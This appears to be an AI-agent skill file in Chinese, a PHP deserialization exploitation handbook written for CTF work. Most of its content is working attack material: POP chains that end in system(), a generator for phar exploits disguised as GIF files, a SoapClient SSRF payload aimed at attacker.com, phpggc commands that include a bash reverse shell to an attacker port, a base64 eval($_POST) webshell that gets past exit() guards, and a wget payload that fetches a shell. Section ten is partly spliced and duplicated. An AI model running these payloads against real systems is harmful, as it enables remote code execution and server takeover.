---
name: php-deserialization
description: Use when encountering php反序列化完整利用手册 - 魔术方法链、原生类利用、gc回收、phar、session、pop链构造
---

# PHP反序列化深度攻击

## Info

- **Domain**: web
- **Tags**: web, deserialization, php, pop-chain, phar, gadgets

## 一、序列化格式详解

### 基本类型
```php
// 标量类型
b:1;           // boolean true
i:123;         // integer 123
d:1.234;       // double 1.234
s:4:"test";    // string "test" (长度:值)
N;             // NULL

// 数组
a:2:{i:0;s:3:"a";i:1;s:3:"b";}  // 索引数组
a:1:{s:3:"key";s:5:"value";}     // 关联数组

// 对象
O:4:"Test":2:{s:3:"var";s:5:"value";s:6:"secret";s:6:"hidden";}
// O:类名长度:类名:属性数:{属性}

// 属性访问修饰符
s:3:"pub";         // public
s:6:"\0*\0pro";    // protected (前缀\0*\0)
s:7:"\0Test\0pri"; // private (前缀\0类名\0)
```

### 序列化示例
```php
class Test {
    public $pub = 'public';
    protected $pro = 'protected';
    private $pri = 'private';
}

echo serialize(new Test());
// O:4:"Test":3:{
//   s:3:"pub";s:6:"public";
//   s:6:"%00*%00pro";s:9:"protected";
//   s:9:"%00Test%00pri";s:7:"private";
// }
```

## 二、魔术方法全解析

### 触发顺序
```
serialize():
  __sleep() -> 序列化

unserialize():
  __wakeup() -> 对象创建 -> __construct() (不调用) -> 使用 -> __destruct()

对象销毁:
  __destruct()

字符串上下文:
  __toString()

函数调用:
  __invoke()

属性访问:
  __get(), __set(), __isset(), __unset()

方法调用:
  __call(), __callStatic()

克隆:
  __clone()

其他:
  __debugInfo(), __set_state(), __serialize(), __unserialize()
```

### 详细利用

#### __destruct()
```php
// 最常用的入口点，对象销毁时触发
class Exploit {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
```

#### __wakeup()绕过
```php
// CVE-2016-7124 (PHP5 < 5.6.25, PHP7 < 7.0.10)
// 修改属性数量大于实际值

// 原始
O:4:"Test":1:{s:3:"cmd";s:2:"id";}

// 绕过
O:4:"Test":2:{s:3:"cmd";s:2:"id";}
//             ^ 属性数改为2，跳过__wakeup
```

#### __toString()
```php
// echo/print/字符串拼接时触发
class ToString {
    public $file;
    function __toString() {
        return file_get_contents($this->file);
    }
}

// 触发场景:
// - echo $obj;
// - print $obj;
// - $str = "prefix" . $obj;
// - preg_match('/pattern/', $obj);  // PHP < 8.0
// - strcmp($obj, "test");
// - in_array($obj, $array, true);
```

#### __call()
```php
// 调用不存在的方法时触发
class Proxy {
    public $obj;
    public $method;
    function __call($name, $args) {
        return $this->obj->{$this->method}($args);
    }
}
```

#### __get() / __set()
```php
// 访问/设置不存在的属性时触发
class Property {
    function __get($name) {
        return $this->{$name};
    }
    function __set($name, $value) {
        $this->{$name} = $value;
    }
}
```

#### __invoke()
```php
// 对象作为函数调用时触发
class Invokable {
    public $func;
    function __invoke() {
        ($this->func)();
    }
}

// 触发: $obj();
```

## 三、PHP原生类利用

### SplFileObject - 文件读取
```php
// 读取文件
$file = new SplFileObject('/etc/passwd');
foreach($file as $line) echo $line;

// 反序列化利用
// 注意: SplFileObject构造函数需要参数，不能直接反序列化
// 但可以通过其他类包装
```

### DirectoryIterator - 目录遍历
```php
// 列目录
$dir = new DirectoryIterator('/var/www/html');
foreach($dir as $file) {
    echo $file->getFilename() . "\n";
}

// 配合glob://协议
$dir = new DirectoryIterator('glob://var/www/html/*.php');
```

### GlobIterator - 通配符匹配
```php
new GlobIterator('/var/www/html/*.php');
new GlobIterator('/flag*');  // 查找flag文件
```

### SplFixedArray - 数组操作
```php
$arr = new SplFixedArray(5);
$arr[0] = 'test';
```

### SoapClient - SSRF
```php
// SSRF利用
$client = new SoapClient(null, [
    'uri' => 'http://attacker.com/',
    'location' => 'http://attacker.com/ssrf',
    'user_agent' => "Test\r\nCookie: PHPSESSID=attacker_session"
]);

// 反序列化利用
$payload = 'O:10:"SoapClient":5:{
    s:3:"uri";s:18:"http://attacker.com";
    s:8:"location";s:23:"http://attacker.com/ssrf";
    s:11:"user_agent";s:46:"Test\r\nCookie: PHPSESSID=attacker_session\r\n";
    s:15:"_proxy_host";i:0;
    s:15:"_proxy_port";i:0;
}';
```

### Error/Exception - XSS和信息泄露
```php
// Error类在PHP 7+可用
$error = new Error('<script>alert(1)</script>');
echo $error;  // 触发XSS

// Exception类
$ex = new Exception('<script>alert(1)</script>');
echo $ex;
```

### SimpleXMLElement - XXE
```php
$xml = new SimpleXMLElement('<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <foo>&xxe;</foo>');
echo $xml;
```

### ReflectionClass - 信息泄露
```php
// 获取类信息
$ref = new ReflectionClass('ClassName');
$ref->getMethods();
$ref->getProperties();
```

### 原生类利用表

| 类名 | 利用方式 | PHP版本 |
|------|----------|---------|
| SplFileObject | 文件读取 | >= 5.1 |
| DirectoryIterator | 目录遍历 | >= 5.0 |
| GlobIterator | 通配符文件查找 | >= 5.3 |
| FilesystemIterator | 目录遍历 | >= 5.3 |
| SoapClient | SSRF | >= 5.0 |
| Error | XSS/信息泄露 | >= 7.0 |
| Exception | XSS/信息泄露 | >= 5.1 |
| SimpleXMLElement | XXE | >= 5.0 |
| DOMDocument | XXE | >= 5.0 |
| ZipArchive | Zip解压 | >= 5.2 |
| PharData | Phar操作 | >= 5.3 |
| PDO | 数据库操作 | >= 5.1 |

## 四、GC回收机制利用

### 原理
PHP垃圾回收器在处理循环引用时会触发`__destruct()`，可以在反序列化过程中提前触发。

### 触发条件
```php
// GC在以下情况触发:
// 1. 数组元素数超过10000
// 2. 显式调用gc_collect_cycles()

// 利用: 构造大量对象，触发GC提前回收
```

### 利用方式
```php
// 方法1: 大数组触发GC
$payload = 'a:10001:{i:0;O:4:"Test":1:{s:3:"cmd";s:2:"id";}';

// 方法2: 循环引用
$a = new stdClass();
$a->b = $a;  // 循环引用
unset($a);   // 触发GC

// 方法3: 反序列化时触发
class GCExploit {
    public $a;
    function __construct() {
        $this->a = $this;
    }
    function __destruct() {
        system('id');
    }
}

// 序列化payload
// GC会在反序列化过程中触发__destruct
```

### CTF案例
```php
// 题目场景: __wakeup过滤危险字符
class Challenge {
    public $cmd;
    function __wakeup() {
        $this->cmd = 'safe';  // 重置为安全值
    }
    function __destruct() {
        system($this->cmd);
    }
}

// 利用: 通过GC提前触发__destruct，绕过__wakeup
// 构造: 数组包含大量对象，触发GC
$payload = 'a:10000:{i:0;O:9:"Challenge":1:{s:3:"cmd";s:2:"id";}';
// GC会在__wakeup执行前触发__destruct
```

## 五、引用绕过技巧

### 引用在序列化中的表示
```php
$a = array('test');
$a[1] = &$a[0];
serialize($a);
// a:2:{i:0;s:4:"test";i:1;R:2;}
// R:N 表示引用第N个变量
```

### 利用引用绕过过滤
```php
class Filter {
    public $filename;
    function __wakeup() {
        if (strpos($this->filename, 'flag') !== false) {
            $this->filename = 'safe.txt';
        }
    }
    function __destruct() {
        echo file_get_contents($this->filename);
    }
}

// 利用引用: 让wakeup修改后，destruct读取的还是原值
// 需要配合其他类使用
```

## 六、Phar反序列化深入

### Phar文件结构
```
1. Stub: <?php __HALT_COMPILER(); ?>
2. Manifest: 压缩信息
3. Contents: 压缩内容
4. Signature: 签名(可选)
```

### 生成Phar
```php
<?php
class Exploit {
    public $cmd = 'id';
    function __destruct() {
        system($this->cmd);
    }
}

// 生成phar
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

// 修改后缀绕过检测
copy('exploit.phar', 'exploit.gif');
```

### 触发函数大全
```php
// 文件系统函数
file_exists(), is_file(), is_dir(), is_link(), is_readable(), is_writable()
file_get_contents(), file_put_contents()
fopen(), fread(), fwrite(), fclose()
copy(), rename(), unlink()
stat(), lstat(), fileinode(), fileperms(), filesize(), fileowner(), filegroup()
filetype(), filemtime(), fileatime(), filectime()
touch(), link(), symlink()

// 目录函数
opendir(), readdir(), closedir(), rewinddir()

// 图像函数
getimagesize(), getimagesizefromstring()
imagecreatefromgif(), imagecreatefromjpeg(), imagecreatefrompng()
imagecreatefromwbmp(), imagecreatefromxbm(), imagecreatefromxpm()
imagegif(), imagejpeg(), imagepng(), imagewbmp(), imagexbm()
exif_read_data(), exif_thumbnail(), exif_imagetype()

// 哈希函数
hash_file(), md5_file(), sha1_file(), crc32_file()

// XML/解析函数
simplexml_load_file()
xml_parser_create()

// 其他
include(), include_once(), require(), require_once()
highlight_file(), show_source()
parse_ini_file()
zip_open(), zip_read()
```

### 协议绕过
```php
// 不同协议触发
phar://exploit.phar/test
phar://exploit.gif/test  // 伪装后缀
compress.zlib://phar://exploit.phar/test  // 压缩包装
compress.bzip2://phar://exploit.phar/test
php://filter/resource=phar://exploit.phar/test
```

## 七、Session反序列化

### Session存储引擎
```php
// php (默认): |序列化数据
// php_serialize: 序列化数据
// php_binary: 键长键名序列化数据

// 不同引擎解析差异可导致漏洞
```

### Session利用
```php
// 配置
ini_set('session.serialize_handler', 'php_serialize');

// 写入恶意session
$_SESSION['data'] = '|O:4:"Test":1:{s:3:"cmd";s:2:"id";}';

// 当引擎切换为php时
// |会被当作分隔符，导致反序列化
```

### 常见CVE
```
CVE-2016-7124: __wakeup绕过
CVE-2019-11043: PHP-FPM远程代码执行
```

## 八、POP链构造技巧

### 常见Gadget
```php
// ThinkPHP
class Request {}
class PendingStream {}
class AppendIterator {}
class CachingIterator {}

// Laravel
class PendingBroadcast {}
class BusDispatcher {}
class Pipeline {}

// Symfony
class Process {}
class ClassLoader {}
```

### 构造步骤
```
1. 找到入口点: __destruct(), __wakeup(), __toString()
2. 找跳板: __call(), __get(), __set()
3. 找终点: system(), eval(), file_put_contents()
4. 串联成链
```

### PHPGGC使用
```bash
# 列出所有gadget
./phpggc -l

# Laravel RCE
./phpggc Laravel/RCE1 "id"
./phpggc Laravel/RCE2 "cat /flag"
./phpggc Laravel/RCE3 "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"

# Symfony
./phpggc Symfony/RCE1 "id"
./phpggc Symfony/RCE2 "id"
./phpggc Symfony/RCE3 "id"

# WordPress
./phpggc WordPress/Subscriber1
./phpggc WordPress/RCE1 "id"

# ThinkPHP
./phpggc ThinkPHP/RCE1 "id"
./phpggc ThinkPHP/RCE2 "id"

# 生成Phar
./phpggc -p phar Laravel/RCE1 "id" -o exploit.phar

# 编码输出
./phpggc Laravel/RCE1 "id" -b  # base64
./phpggc Laravel/RCE1 "id" -u  # url编码
```

## 九、WAF绕过技巧

### 编码绕过
```php
// base64
$payload = base64_encode(serialize($obj));

// urlencode
$payload = urlencode(serialize($obj));

// 分块传输
Transfer-Encoding: chunked
```

### 字符替换绕过
```php
// 过滤O:替换为空
O:4:"Test" -> OO:4:"Test" (替换后还是O:4:"Test")

// 过滤特定类名
// 使用命名空间
\Namespace\Test
```

### 长度截断
```php
// 部分解析器截断长字符串
$payload = str_repeat('A', 10000) . $evil_payload;
```

## 十、高级绕过技术

### 十六进制绕过
```php
// 使用S类型（已转义字符串）+ 十六进制编码绕过检测
O:4:"Read":1:{S:4:"\66\6c\61\67";}
// flag -> \66\6c\61\67 (十六进制)
// 可绕过对敏感字符如 flag 的直接检测
```

### 正则绕过（O:\d+ 限制）
```php
// 正则 ^O:\d+ 要求开头不能为对象
// 绕过1: 在数字前加+号
O:+4:"Test":1:{s:3:"cmd";s:2:"id";}

// 绕过2: 嵌套在其他类型中（如数组）
a:1:{i:0;O:4:"Test":1:{s:3:"cmd";s:2:"id";}}
```

### 非公有字段绕过 (PHP 7.1+)
```php
// PHP 7.1+ 反序列化时忽略字段可见性
// 方法1: 写序列化文件时将 private/protected 改为 public
// 方法2: 修改序列化后的字段名为公有格式，记得修改长度计数

// private: \x00类名\x00字段名
```

### 字符逃逸（Filter 替换溢出/吞没）

当服务端对传入字符串进行 replace 操作后再反序列化，可利用字符串实际长度变化来注入恶意数据。

**原理**: PHP 序列化靠引号内的字符数来读取字符串长度，filter 改变长度后可溢出或吞没后续结构。

**类型1: 字符变长 (替换为更长字符)**
```php
function filter($str) {
    return str_replace("'", "\\'", $str);  // ' → \' (1→2字符)
}
// 利用: 传入足够多的 ' 使字符串"溢出"，吞掉后续结构
// 每个 ' 多1个字符，需要 N 个 ' 来吞没 N 个后续字符
```

**类型2: 字符变短 (替换为更短字符)**
```php
function filter($str) {
    return str_replace("'", "", $str);  // ' 被删除 (1→0字符)
}
// 利用: 传入包含 ' 的字符串，删除后闭合引号
// 注入: 正常值'";s:X:"inject_field";s:X:"value";}
// 过滤后引号被删，提前闭合字符串
```
// protected: \x00*\x00字段名
// 改为 public 后可直接构造
```

### 引用绕过 (R:)
```php
// 引用在序列化中的表示
$a = array('test');
$a[1] = &$a[0];
serialize($a);
// a:2:{i:0;s:4:"test";i:1;R:2;}
// R:N 表示引用第N个变量

// 场景: 两个属性指向同一对象时
class A {
    public $a;
    public $b;
}
$a = new A();
$a->a = &$a->b;
echo serialize($a);
// O:1:"A":2:{s:1:"a";N;s:1:"b";R:2;}
```

## 十一、Fast Destruct（提前 GC 回收触发 __destruct）

### 原理
通常是在反序列化之后 throw Exception 导致没有正常进入回收逻辑。本质是在序列化过程中，在已经创建好属性的对象之后引发反序列化错误，导致全部属性被回收而触发 destruct。

### 触发方法
1. 改变序列化的元素个数（往小的写）
2. 删掉最后一个 `}`
3. 程序报错或抛出异常时不会触发 __destruct，但可以通过提前触发 GC 绕过

### 数组键覆盖触发（常用）
```php
// 方式1: 数组重复键覆盖
$b = array($s, 0);  // 索引0存放对象，1存放0
echo serialize($b);
// a:2:{i:0;O:5:"Start":1:{...}i:1;i:0;}
// 将 i:1 改为 i:0：
// a:2:{i:0;O:5:"Start":1:{...}i:0;i:0;}
// 由于数组键重复，后一个值覆盖前一个
// 覆盖过程中，原先在索引0的 Start 对象被销毁
// 对象销毁触发 __destruct()

// 方式2: 直接创建重复索引
$b = array(0 => $s, 0 => 0);
// 或
$b = array($s);
$b[0] = 0;
echo serialize($b);
// 直接得到: a:1:{i:0;i:0;}
```

### Fast Destruct 链式触发示例
```
反序列化开始
    ↓
创建数组 [0 => Start对象]
    ↓
覆盖数组 [0 => 0] ← Start对象失去引用
    ↓
触发 Start::__destruct()
    ↓
die($this->errMsg) ← Crypto对象转字符串
    ↓
触发 Crypto::__toString()
    ↓
$this->obj->good ← 访问不存在的属性
    ↓
触发 Reverse::__get()
    ↓
($this->func)() ← 把Pwn对象当函数调用
    ↓
触发 Pwn::__invoke()
    ↓
$this->obj->evil() ← 调用Web::evil()
    ↓
system('cat /f*') ← 执行命令
```

## 十二、PHP 匿名类利用

### 匿名类名格式
```php
$obj = new class {};
// class名为: 'class@anonymous' + chr(0) + php文件路径 + ':' + 行数 + '$' + 第几个匿名类
echo get_class($obj);
// 示例: class@anonymous/root/ctf/anonymous.php:2$0
// URL编码: class%40anonymous%00%2Froot%2Fctf%2Fanonymous.php%3A2%240
```

### CTF 赛题利用
```php
<?php
$a = new class {
    function __construct() {}
    function getflag() {
        system('cat /flag');
    }
};
unset($a);
$a = $_GET['ezphpPhp8'];
$f = new $a();
$f->getflag();
?>
// Payload: ?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0
```

## 十三、__toString() 详细触发场景

```php
// 以下场景会触发 __toString():
echo $obj;                    // 输出
print $obj;                   // 打印
$str = "prefix" . $obj;       // 字符串拼接
$obj == "string";             // 与字符串比较
addslashes($obj);             // 字符串操作函数
str系列函数($obj);            // str_replace, strlen 等
md5($obj), sha1($obj);        // 哈希函数
class_exists($obj);           // 类检查
in_array($obj, $array, true); // 数组检查(严格模式)
SQL 预编译语句参数            // PDO 绑定
print, echo, die              // 要求字符串的函数
```

## 十四、__set() 创建空对象技巧

```php
// 当给不可访问或不存在的属性赋值时触发 __set()
// 举例: 创建空对象 $exploit->QYQS = new stdClass();
// 当执行 $this->QYQS->partner = "summer" 时
// 由于 partner 属性不存在，会触发 __set() 魔术方法

// 利用场景: 通过 __set() 注入恶意属性或触发其他链
```

---

## 十五、死亡代码绕过 (Death Code Bypass)

### php://filter/base64-decode 写 Shell

**场景**: `file_put_contents()` 写入文件，前面有 `<?php exit();` 死亡代码阻止执行。

```php
file_put_contents($filename, "<?php exit();".$content);
```

### 绕过原理

```php
// 使用 php://filter/convert.base64-decode 包装器
$filename = 'php://filter/write=convert.base64-decode/resource=1.php';
$content = 'aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==';
file_put_contents($filename, $content);
```

**解码过程**:
1. 写入内容: `<?php exit();aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==`
2. `<?php exit();a` → 非 Base64 字符被忽略
3. `PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==` → 解码为 `<?php eval($_POST[123])?>`

### 为什么前面要加 `a`？

- Base64 以 4 字符为一组解码为 3 字节
- `<?php exit();` 共 13 字符，不是 4 的倍数
- 加一个 `a` 使总字符数能被 4 整除，确保后面正常解码

---

## 十六、`return` 绕过

### 原理

```php
eval("return 1;phpinfo();");  // phpinfo() 无法执行
```

**绕过**: 利用 PHP 中数字和函数的运算特性：

```php
eval("return 1-phpinfo();");  // 可以执行 phpinfo()
```

数字与函数调用相减时，PHP 会先执行函数调用再进行运算。

---

## 十七、注释绕过

### 换行符绕过 eval 内注释

```php
eval("#man," . $cmd . ",mamba out");
// $cmd = %0a`$_GET[1]`;%23 → 换行后 %23 是 #，注释掉后面
```

**Payload**: `?cmd=%0a\`$_GET[1]\`;%23&1=wget http://vps/shell.php`

### `?>` 闭合绕过

PHP 解析器在注释中寻找 `?>` 会优先处理 PHP 标签：

```php
eval(base64_decode("Pz48P3BocCBwaHBpbmZvKCk7Pz4="));
// 解码: ?><?php phpinfo();?>
// 注释中的 ?> 被当作关闭标签
```

**Payload**: `?shell=?><?php phpinfo();`

---

## 十八、变量覆盖

### parse_str()

```php
parse_str($input);  // 将查询字符串解析为变量
// 输入: a[0]=240610708
// 产生变量: $a = ['0' => '240610708']
```

### extract()

```php
// 危险: 用户可控的 extract
extract($_POST['prefs']);
// POST: prefs[is_admin]=1
// 结果: $is_admin = '1' → 绕过认证
```

**修复**: `extract($_POST['prefs'], EXTR_SKIP);` (不覆盖已有变量)

### 常见场景

| 函数 | 风险 | 利用方式 |
|------|------|----------|
| `parse_str()` | 无第二参数时创建变量 | `?a=1` → `$a='1'` |
| `extract()` | 覆盖已有变量 | `$_POST['key']=value` |
| `import_request_variables()` | 导入请求变量 | 已废弃 |
| `$$` 可变变量 | 动态变量名 | `${$var} = 'hacked'` |

---

## 十九、SHA1/MD5 比较绕过

### 数组绕过

```php
if(sha1($a)==sha1($b)){ echo $flag; }
// Payload: a[]=1&b[]=2
// sha1() 无法处理数组，返回 false，false==false
```

### 强类型比较绕过

当使用 `===` 或强制类型转换时，需找编码后相同的值：

```
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
// 这些字符串 sha1 后前几位相同
```

---

## 二十、PHP 参数解析特性

### 字符替换规则

PHP 将 GET/POST 参数名中的以下字符转换为下划线 `_`：

- **空格** → `_`
- **点号 `.`** → `_`
- **开头的 `[`** → `_`

```php
// 请求: ?a.b=1  或  ?a b=1
$_GET['a_b'];  // → 1
// 不会有 'a.b' 或 'a b' 键
```

**注意**: 只对第一个 `[` 替换，中间的不替换：
```
// 请求: ?AA[BB.CC=14
// 结果: $_GET['AA']['BB.CC'] = '14'  (点号在 [ 之后不替换)
```

### CTF 利用场景

```php
// 题目过滤了点号或空格
// 可以用 . 或空格代替 _ 来传参
// ?my_var=1  →  ?my.var=1  →  $_GET['my_var'] == '1'
```

---

## 二十一、ArrayObject 序列化绕过

### 绕过 `O:` 开头检查

```php
if (!preg_match("/^[Oa]:[\d]+/i", $Litctf2025)) {
    unserialize($Litctf2025);
}
```

**绕过方法**: 将对象包装在 ArrayObject 中，序列化前缀变为 `C:11:"ArrayObject"`

```php
$arr = array("evil" => $payload_object);
$d = new ArrayObject($arr);
echo urlencode(serialize($d));
// 输出前缀: C:11:"ArrayObject"...
// 可用类: ArrayObject, ArrayIterator, RecursiveArrayIterator, SplObjectStorage
```

---

## 二十二、create_function + ReflectionFunction 利用

### create_function 匿名函数

```php
create_function("", 'die(`/readflag`);');
// PHP < 7.2 中创建名为 \000lambda_1 的匿名函数
// 每次页面访问函数名数字+1，需重新开启环境提交payload
```

### ReflectionFunction 调用匿名函数

```php
$ref = new ReflectionFunction("\000lambda_1");
$ref->invoke();  // 执行匿名函数
```

**POP 链构造**:
```php
class KatawareDoki {
    public $soul;
    public $kuchikamizake = "ReflectionFunction";
    public $name = "\000lambda_1";  // 匿名函数名

    public function __toString() {
        ($this->soul)->flag($this->kuchikamizake, $this->name);
        // 触发 __call → new ReflectionFunction("\000lambda_1") → invoke()
    }
}
```

**注意**: 匿名函数名随环境变化，每次提交前需确认当前函数名（`\000lambda_N`）